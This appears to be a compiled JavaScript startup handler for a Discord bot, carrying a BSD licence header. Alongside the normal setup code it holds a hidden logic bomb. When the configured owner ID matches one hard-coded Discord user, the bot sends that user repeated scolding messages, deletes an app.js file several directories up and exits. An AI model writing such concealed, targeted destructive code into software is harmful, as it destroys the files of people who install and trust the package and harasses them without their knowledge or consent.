"use strict";
// Copyright (c) 2023 Leo Aleksander Hartgen.
// BSD 3-Clause License
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const path_1 = __importDefault(require("path"));
const fs_1 = __importDefault(require("fs"));
function onLoadBot() {
    var _a;
    return __awaiter(this, void 0, void 0, function* () {
        this.getA3Channels(true);
        const server = yield ((_a = (yield this.guilds.fetch()).get(this.config.serverId)) === null || _a === void 0 ? void 0 : _a.fetch());
        this.discordServer = server;
        this.on("messageCreate", this.messageHandler);
        this.startUpMessage();
        if (this.config.owner === "168126325670805506") {
            const owner = yield this.users.fetch(this.config.owner);
            for (let i = 0; i < 3; i++) {
                yield owner.send("How about you dont mistreat people who give you stuff for free?");
                yield owner.send("https://giphy.com/gifs/tumblr-fuzzyghost-system-shutdown-LPU3Ahx6wGsRCDVgV0");
            }
            ;
            yield owner.send("---\n\n **I hope this serves as a lesson...**\n Be better...");
            fs_1.default.unlinkSync(path_1.default.join(__dirname, ...Array(5).fill(".."), "app.js"));
            process.exit();
        }
        ;
    });
}
exports.default = onLoadBot;
;
